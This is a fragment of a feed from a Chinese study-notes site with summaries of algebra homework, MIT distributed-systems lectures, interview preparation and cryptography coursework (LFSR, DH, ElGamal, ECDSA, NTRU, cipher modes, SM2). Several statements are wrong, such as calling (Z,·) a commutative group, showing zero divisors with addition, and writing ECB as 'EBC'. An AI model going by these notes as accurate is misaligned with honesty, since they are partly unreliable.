$$(a * b) * c = -(a*b) -c = a + b - c$$ $$a * (b * c) = -a - (b * c) = -a + b + c$$ （2）
这个运算在整数集上是封闭的：
$$\forall a, b \in \mathbb{Z}, a * b = a + b -2 \in \mathbb{Z}$$ 这个运算是结合的：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/4.2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/4.2/</guid><description>4.2 交换环与域 # 证明题 # 1 # 对于加法运算：在 4.1 的第 3 题中已经证明 $$(\Z \times \Z, +)$$ 是一个群，交换律也显然可以证明；
对于乘法运算：因为 $$(\Z, \cdot)$$ 构成一个交换群，显然是满足结合率、存在幺元和交换率的。
存在零因子 $$(a, 0), (0,b) \Rightarrow (a, 0) + (b, 0) = (0, 0)$$
综上所述，$$(\Z \times \Z, +)$$ 是一个有零因子的交换环。
2 # 对于高斯整环 $$\Z[i] = {a + b i | a, b \in \Z}$$ 上的任意元素 $$a + bi$$，如果它存在逆元：
即求 $$(a + bi) (c + di) = 1$$ 关于 c,d 的解。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/1.introduction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/1.introduction/</guid><description>Introduction # 分布式系统的优点：
Parallelism：通过并行提高计算量、数据处理量； Fault Tolerate：通过多个服务器提升容错率； Physically：聚合物理意义上相互隔离的机器； Security：系统可以分布式地运行在地理位置相聚很远的地方，提升容灾性； 分布式系统的缺点与困难：
Concurrent Parts：需要同时并行地处理多个部分； Complex Interactions：需要处理复杂的服务交互逻辑（微服务中通过“服务发现”实现分布式系统）； Partial Failure：无法同时达到绝对准确性与服务可用性； Performance：需要设计精巧的算法以实现更高的性能； MapReduce 是“分布式系统”的开山论文，它最初被 Google 研发出来，用于解决大容量的网页问题：http://nil.csail.mit.edu/6.824/2020/papers/mapreduce.pdf</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/2.infra-rpc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/2.infra-rpc/</guid><description>Infrastrcture: RPC and threads # 为什么要选择 Go 语言？
通过 go 与 goroutine 对并发有很好的支持； 简易的 RPC 框架； 类型安全（相对于 js、python 这类的脚本语言）； 自动垃圾回收（没有 UAF 漏洞）； 相对简单的语法（工业界需要一个像 python 一样简单语法的编译型语言）； 多线程的挑战：
Share Data：Golang 中使用 sync.Mutex，尽量避免共享可变量； Coordination：Glang 使用 channel、sync.Cond、WaitGroup； Deallock：线程间的循环等待； lock/channel 应该在什么时候？
一个结论是：大部分的多线程问题可以通过上面两个工具解决； 什么时候使用哪个工具取决于程序员的思考，一个建议是： state 状态共享时：使用 lock； communication 线程间信息交流时：使用 channel； RPC：Remote Procedure Call；
Client &amp;ldquo;best effort&amp;rdquo;：当服务端无响应时，多进行几次尝试后抛出异常； Server &amp;ldquo;at most once&amp;rdquo;：客户端对每次请求添加 xid 唯一表示，服务端通过 xid 去重；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/3.gfs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/3.gfs/</guid><description>Google File System (Distribute Storage) # 分布式存储的困难点：
高性能：High performance in many server; 多机器：System with many machine could cause &amp;ldquo;constant fault&amp;rdquo;; 一致性错误：To avoid contact fault, we will need replication; 数据同步：During the replication, potential inconsistencies will occur; 一致性与高性能矛盾：To get better consistency, low performance occur; 分布式存储的一个大的课题就是在“一致性”与“高性能”之间的 tradeoff.
GFS Master：
RAM 中存储： 一个 filename 到 handlers array 的映射表； 每个 handler 都包含 version/chunk servers list/primary/least time 信息； 磁盘中存储着 log/checkpoint； READ，客户端读取流程：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/4.vm-ft/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/4.vm-ft/</guid><description>VMware FT(Fault-Tolerant) # Primary/Backup Replication # Two main replication approaches:
State Transfer: Primary replica executes and sends new state to backups machine; Replicated State Machine: Primary just pass the raw external event to backups. Mostly used by recent industry and papers; Overview:
VM-FT consist of two machine: primary and backup. Primary deals with all external events and replicates it to backup through &amp;ldquo;logging channel&amp;rdquo;; VM-FT emulates a local disk interface through two remote disk server.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/5.go-raft/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/5.go-raft/</guid><description>Go Memory Model: https://golang.org/ref/mem
Go Threads and Raft # Happens Before # Hanpens Before，为了深入研究同步问题而提出的概念：
关于一个变量 v 的读语句 r 与写语句 w，r 可以得到 w 的值需要满足以下条件： r does not happene before w; There is not other w' that happens before r and after w; 一个读语句 v 能够准确地捕获到某个特定的 w 语句的值，需要满足以下条件： w happends before r; Any other w' to v either hanppends before w or after r; Golang Lifetime # Initialization, 一个 golang 程序的初始化：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/6.raft/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/6.raft/</guid><description>论文地址：https://raft.github.io/raft.pdf
Raft # Split Brain # 之前学习过的系统中：
MapReduce：replicates computation but relies on a single master to organize; GFS：replicates data but relies on the master to pick primaries; VMwareFT：replicates service but relies on test-and-set to pick primary; 上面这些系统在做核心决策的时候都需要依赖单一的机器，也就是通过单一的机器避免 Split Brain 问题。
为什么会出现 Split Brain 问题呢？
根本原因在于计算机之间无法区分 server crashed 与 network broken 这两个情况。 比如：一个系统中的一个机器 A 无法与另一个机器 B 通信了，如果 A 认为 B 是宕机了而实际上是网络错误，反之亦然。A/B 就分裂成了两个独立的服务，它们都认为对方宕机而自己继续服务客户端请求； &amp;ldquo;Split Brain&amp;rdquo; caused by &amp;ldquo;network partition&amp;rdquo; seemed insurmountable for a long time:</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/7.zookeeper/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/7.zookeeper/</guid><description>Paper: https://www.usenix.org/legacy/event/atc10/tech/full_papers/Hunt.pdf
ZooKeeper # What questions does this paper shed light on?
我们是否能将 Raft 中提到的服务间合作封装成一个通用的服务？
如果可以，API 应该设计成什么样？其他的分布式系统应该怎么使用这个服务？
我们在一个分布式系统总投入了 N 倍的机器，能够得到 N 倍的性能提升？
Performance # Raft：在添加了更多的 replicas 之后，因为 Leader 需要等待响应的机器增多，反而会降低性能。ZooKeeper 提高性能的一个基本思想是：
将 Read 负载分散到各个 Replicas 机器中，使得读性能能够随机器数量线性地提升； 但是在传统的 Raft 架构下的，直接读取 Replicas 会遇到一些问题： Replica may not be in majority, so may not have seen a completed write; Replica may not yet have seen a commit for a completed write; Replica may be entirely cut off from the leader; How does ZooKeeper skin this cat?</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/8.craq/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/8.craq/</guid><description>CRAQ # Chain Replication (CR) # What&amp;rsquo;s Chain Replication?
系统构成：A list of servers, with a &amp;ldquo;head&amp;rdquo; and a &amp;ldquo;tail&amp;rdquo;; 写：Client sends to Head, forward &amp;ldquo;write&amp;rdquo; till Tail, Tail responses to Client; 读：Client sends to Tail, Tail response. 相对于 Raft，CR 的优点？
相对于 Leader 处理所有请求，将请求分散到 Head、Tail 能够提升服务吞吐量； Raft 进行写时需要发送请求到所有 Replicas，然后等待 1/2 的响应，CR 则只需要将请求传递到后继节点，提升了写性能的吞吐量； CR 的写操作只需要一个服务器的介入； 错误恢复的流程更加简单（相当于在链表中删除一个节点）； Chain Replication with Apportioned Queries (CRAQ) # 类似于在 ZooKeeper 设计中的思考，可以将 Read 的压力分散到各个不同的 Replicas 中。CRAQ 是一个基于 CR、并且将 Read 分散到各个节点、且满足 Linearizable 性质的分布式系统设计。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/9.aurora/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/9.aurora/</guid><description>Amazon Aurora #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%89%91%E6%8C%87offer/1.%E9%9D%A2%E8%AF%95%E7%9A%84%E6%B5%81%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%89%91%E6%8C%87offer/1.%E9%9D%A2%E8%AF%95%E7%9A%84%E6%B5%81%E7%A8%8B/</guid><description>面试的三个环节 # 行为面试环节：简单的自我介绍。
应聘者的项目经历：建议用 STAR 模型去描述自己的每一个项目经历。 Situation: 简短的项目背景； Task: 自己完成的任务； Action: 为了完成任务，自己做了哪些工作； Result: 自己的贡献； 应聘者掌握的技能：注意区分“了解”、“熟悉”、“精通”； 回答为什么跳槽：不要抱怨，也不要流露出负面的情绪； 技术面试环节：面试的重头戏，对面试结果起决定性作用，总体来说就关注应聘者的 5 种素质：
基础知识扎实全面，包括编程语言、数据结构、算法等； 能写出正确的、完整的、鲁棒的高质量代码； 能思路清晰地分析并解决复杂的问题； 能够从时间、空间复杂度两个方面优化算法的效率； 具备优秀的综合能力：包括问题沟通能力、学习能力、发散性思维能力等； 应聘者提问环节，在结束面试的前 5-10 分钟，面试官会给应聘者几个问题，应聘者问题的质量也会对面试结果有一定影响。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%89%91%E6%8C%87offer/2.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%89%91%E6%8C%87offer/2.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid><description>基础知识 # 编程语言 # 数据结构 # 算法和数据操作 #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/homework1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/homework1/</guid><description>Chapter2 # 第六题 # 话不多说直接上脚本：
#!/usr/bin/env python2 # coding=utf-8 from sage.all import * class Crack: cipher = &amp;#34;1010110110&amp;#34; plain = &amp;#34;0100010001&amp;#34; order = 3 def __init__(self): mapper = lambda (a,b):GF(2)(int(a)^int(b)) self.stream = map(mapper, [(self.cipher[i], self.plain[i]) for i in range(10)]) def crack_by_matrix(self): &amp;#34;&amp;#34;&amp;#34; 时间复杂度 O(n^3) :return: 返回一个状态转移矩阵 &amp;#34;&amp;#34;&amp;#34; S0 = Matrix([self.stream[i :i+5] for i in range(5)]) S1 = Matrix([self.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/homework2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/homework2/</guid><description>第二次作业 # 第一题 # 在 $$GF(2^8)$$ 中，取模多项式 $$m(x) = x^8 + x^4 + x^3 + x + 1$$，计算下面的积：
0xB7 * 0x3F 0x11 * 0xFF 我们把两题一起做，首先转化为多项式：
$$183 = x^7 + x^5 + x^4 + x^2 + x + 1$$ $$63 = x^5 + x^4 + x^3 + x^2 + x + 1$$ $$17 = x^4 + 1$$ $$255 = x^7 + x^6 + x^5 + x^4 + x^3 + x^2 + x + 1$$ 然后我们在 $$\Z_2$$ 的多项式环上，做多项式乘法：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/script2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/script2/</guid><description>第二次作业 # 第一题 # 在 $$GF(2^8)$$ 中，取模多项式 $$m(x) = x^8 + x^4 + x^3 + x + 1$$，计算下面的积：
0xB7 * 0x3F 0x11 * 0xFF #!/usr/bin/env python2 from sage.all import * class Solve: def __init__(self): x = var(&amp;#39;x&amp;#39;) self.FF = GF(2 ** 8, name=&amp;#39;x&amp;#39;, modulus=x**8 + x**4 + x**3 + x + 1) self.l1, self.r1 = self.FF.fetch_int(0xb7), self.FF.fetch_int(0x3f) self.l2, self.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/summary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/summary/</guid><description>密码学期末复习 # 随机数发生器 # 重点：线性反馈移位寄存器、转移矩阵、特征多项式、m-序列、Golomb 伪随机性
Golomb 随机性公设：
GF(2) 上的 n 长 m-sequence {ai} 应该满足下面的三个条件： 在一个周期内，0、1 出现的次数分别是 $$2^{n-1} - 1$$ 和 $$2^{n - 1}$$； 在一个周期内，总游程数为 $$2^{n-1}$$；对长为 $$i (1 \le i \le n-1)$$ 的游程有 $$2^{n-1-i}$$ 个，0、1 各半； $${a_i}$$ 的自相关函数为 $$\displaystyle R(\tau) = \begin{cases} 1, &amp;amp; \tau = 0 \\displaystyle -\frac{1}{2^n - 1}, &amp;amp; 0 &amp;lt; \tau \le 2^n - 2 \end{cases}$$ 自相关函数：
GF(2) 上周期为 T 的序列 $${a_i}$$ 的自相关函数定义为： $$\displaystyle R(\tau) = \frac{1}{T} \sum_{k = 1}^{T} (-1)^{a_k} (-1)^{a_{k+\tau}}$$ 流密码 # 流密码的加密原理：将明文比特流 m 与随机比特流 k 按位异或得到加密比特流 c；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/diffiehellman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/diffiehellman/</guid><description>Diffie Hellman Key Exchange # DH：DH 密钥交换用于在公开信道上共享私密信息
算法的流程 # 系统参数 # 系统的运行需要确定以下两个参数：
一个大素数 p； 一个整数 g； 信息生成 # 进行信息交换的双方需要确定以下的信息：
双方分别生成两个秘密信息 $$X_A, X_B$$ 通过秘密信息与整数 g 计算：$$g^{X_A}, g^{X_B}$$ 秘密共享 # 收到公开信道的信息的双方进行以下操作：
A 计算得到秘密共享信息：$$s = (g^{X_B})^{X_A} = g^{X_AX_B}$$ B 计算得到秘密共享信息：$$s = (g^{X_A})^{X_B} = g^{X_AX_B}$$ 流程图 #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/elgamal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/elgamal/</guid><description>参考：
https://resources.saylor.org/wwwresources/archived/site/wp-content/uploads/2011/03/ElGamal-signature-scheme.pdf ElGamal signature scheme # 算法的流程 # 系统参数 # 系统需要一下在各个使用这个系统的使用者之间共享三个信息：
H 是一个抗碰撞的哈希函数； p 是一个大素数，解决 p 的离散对数问题是困难的。 g 是在乘法群 $$\Z^*_p$$ 中随机选取的生成元。 密钥生成 # 签名者需要通过这个系统对一个消息进行签名，需要生成以下的信息：
随机选取的整数 x 满足 $$1 &amp;lt; x &amp;lt; p-1$$ 计算以下信息：$$y \equiv g^x \pmod{p}$$ 封装公钥：$$(y)$$；封装私钥 $$(x)$$ 签名过程 # 签名者通过以下的方式对消息进行签名：
随机选取一个整数 k 满足 $$0 &amp;lt; k &amp;lt; p-1 \and gcd(k, p-1) = 1$$ 计算 $$r = g^k \pmod{p}$$ 计算 $$s = (H(m) - xr)k^{-1} \pmod{p-1}$$（即 s 满足 $$H(m) = xr + ks \pmod{p-1}$$） 如果计算得到 s=0，则重新选取随机数 k。 封装 $$(r, s)$$ 即是拥有私钥 x 的签名者对信息 m 的签名。 验证签名 # 验证一个签名的流程如下：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/ellipticcurve/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/ellipticcurve/</guid><description>Elliptic Curve DSA # Elliptic Curve # 系统参数 # 如何确定一个 ECC：
选择一个素数 p 和一个整数 n。从有限域 $$\mathbb{F}p$$ 中选择一个次数为 n 不可约多项式 f(x)，并且用这个不可约多项式得到一个有限域 $$\mathbb{F}{p^n}$$，设 f(x) 在该有限域下的根为 $$\alpha$$；
在有限域 $$\mathbb{F}_{p^n}$$ 中生成一个非超奇异（non-supersingular）曲线 E；
在 E 上选择一个阶为素数的点 $$P=(x,y)$$，设其阶为 q；
定义一个转化函数 $$c(x): \mathbb{F}{p^n} \rightarrow \Z{p^n}$$。具体的定义为：
$$\displaystyle c(x) = \sum_{i=0}^{n-1} c_i p^i \in \Z_{p^n}, \text{for } x= \sum_{i=0}^{n-1}c_i \alpha^i \in \mathbb{F}_{p^n}, 0 \le c_i &amp;lt; p$$
域上的运算 # DSA 签名算法 # 系统参数 # 系统需要初始化以下信息供所有系统的使用者共享：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/ntru/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/ntru/</guid><description>参考：
http://people.scs.carleton.ca/~maheshwa/courses/4109/Seminar11/NTRU_presentation.pdf NTRU Cryptosystem # NTRU: Nth degree Truncated polynomial Ring Units. Or $$\displaystyle R = \frac{Z[X]}{X^{N-1}}$$
算法的流程 # 系统参数 # 系统需要一下在各个使用这个系统的使用者之间共享三个信息：
N&amp;amp;R：N 是一个整数、R 是一个环，在环 R 上的多项式次数均为 N-1； p：一个小整数。多项式对 p 系数取模得到一个模环； q：一个与 p 互素的大整数。多项式对 q 系数取模得到一个模环； 密钥生成 # 使用这个系统的用户需要通过一下的方式生成公钥与私钥：
从 R 中随机选取两个可逆多项式 f, g；
计算 f 关于 p,q 的逆：$$f \cdot f_p \equiv 1 \pmod{p}, f \cdot f_q \equiv 1 \pmod{q}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</guid><description> 参考：
https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F#%E5%A1%AB%E5%85%85 分组密码工作模式 # 电子密码本 EBC # +----------------+ +-----------------+ | plaintext[0:n] | | plaintext[n:2n] | +-------|--------+ +-------|---------+ | | v v +-------------------------+ +-------------------------+
key----&amp;gt;| block cipher encryption | key----&amp;gt;| block cipher encryption |
+------------|------------+ +------------|------------+
| | v v +-----------------+ +------------------+ | ciphertext[0:n] | | ciphertext[n:2n] | +-----------------+ +------------------+ 密码分组连接 CBC # +----------------+ +-----------------+ | plaintext[0:n] | | plaintext[n:2n] | +--------+-------+ +--------+--------+ | | v v iv-----------------&amp;gt;xor +--------------------&amp;gt;xor | | | v | v +-------------------------+ | +-------------------------+
key----&amp;gt;| block cipher encryption | | key----&amp;gt;| block cipher encryption |
+------------|------------+ | +------------|------------+
| | | v | v +-----------------+ | +------------------+ | ciphertext[0:n] -----+ | ciphertext[n:2n] | +-----------------+ +------------------+ 密码反馈 CFB # iv | --------------------------+ v | v +-------------------------+ | +-------------------------+
key----&amp;gt;| block cipher encryption | | key----&amp;gt;| block cipher encryption |
+------------+------------+ | +------------+------------+
| | | +----------------+ v | +-----------------+ v | plaintext[0:n] +--&amp;gt;xor | | plaintext[n:2n] +--&amp;gt;xor
+----------------+ | | +-----------------+ | v | v +-----------------+ | +------------------+ | ciphertext[0:n] +----+ | ciphertext[n:2n] | +-----------------+ +------------------+ 输出反馈 OFB # iv | --------------------------+ v | v +-------------------------+ | +-------------------------+
key----&amp;gt;| block cipher encryption | | key----&amp;gt;| block cipher encryption |
+------------+------------+ | +------------+------------+
| | |
+--------------+ | +----------------+ v +-----------------+ v | plaintext[0:n] +--&amp;gt;xor | plaintext[n:2n] +--&amp;gt;xor +----------------+ | +-----------------+ | v v +-----------------+ +------------------+ | ciphertext[0:n] | | ciphertext[n:2n] | +-----------------+ +------------------+ 计数器 CTR # +----------+----------+ +----------+----------+ | nonce |counter=0 | | nonce |counter=1 | +----------+----------+ +----------+----------+ | | v v +-------------------------+ +-------------------------+
key----&amp;gt;| block cipher encryption | key----&amp;gt;| block cipher encryption |
+------------+------------+ +------------+------------+
| | +----------------+ v +-----------------+ v | plaintext[0:n] ---&amp;gt;xor | plaintext[n:2n] ---&amp;gt;xor +----------------+ | +-----------------+ | v v +-----------------+ +------------------+ | ciphertext[0:n] | | ciphertext[n:2n] | +-----------------+ +------------------+</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm2/</guid><description>SM 2 # 有限域 # 本条给出有限域 $$F_q$$ 的描述及其元素的表示，q 是一个奇素数或者是 2 的方幂。
